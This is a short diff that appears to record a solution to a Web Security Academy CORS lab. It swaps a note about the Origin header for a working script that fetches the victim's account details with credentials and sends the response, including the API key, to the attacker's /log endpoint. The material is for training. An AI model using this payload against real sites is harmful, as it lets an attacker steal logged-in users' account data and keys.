@@ -1,2 +1,12 @@
-ADd the header in the request : 
-    Origin: https://example.com
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0a78007103acb12b80c0d04c00830009.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+
